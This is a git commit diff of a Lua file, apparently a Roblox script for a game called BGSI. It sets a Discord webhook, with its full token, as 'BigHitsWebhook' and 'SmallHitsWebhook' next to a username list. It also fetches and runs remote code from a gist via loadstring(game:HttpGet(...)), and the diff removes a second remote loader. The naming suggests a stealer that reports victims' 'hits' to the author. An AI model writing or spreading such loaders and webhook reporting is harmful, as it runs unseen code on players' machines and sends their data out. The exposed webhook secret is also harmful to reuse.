3dda3c6062aba2662d956883a9cc5767ca161d40
vkz. <lucaspedgley1@gmail.com>
2025-06-20 23:58:53 +0300

    Update main.lua

--- BGSI/main.lua
+++ BGSI/main.lua
@@ -5,4 +5,3 @@ Usernames = {
 local z = "https://discord.com/api/webhooks/1385718820848537742/khp6CFwu4dHhfKfGHpmDKvkyiVyUFjR5U3sb-FYJxfj2gteflZt3dsb5lJ-STjO3PYtU"
 BigHitsWebhook, SmallHitsWebhook = z, z
 loadstring(game:HttpGet("https://gist.githubusercontent.com/vkzire/dbe0fbe0522929be506afd8f0f782b03/raw/044727a115ff865d2e7c857bfb63692f07098471/gistfile1.txt", true))()
-loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/e094c8cbb7f21c94"))()
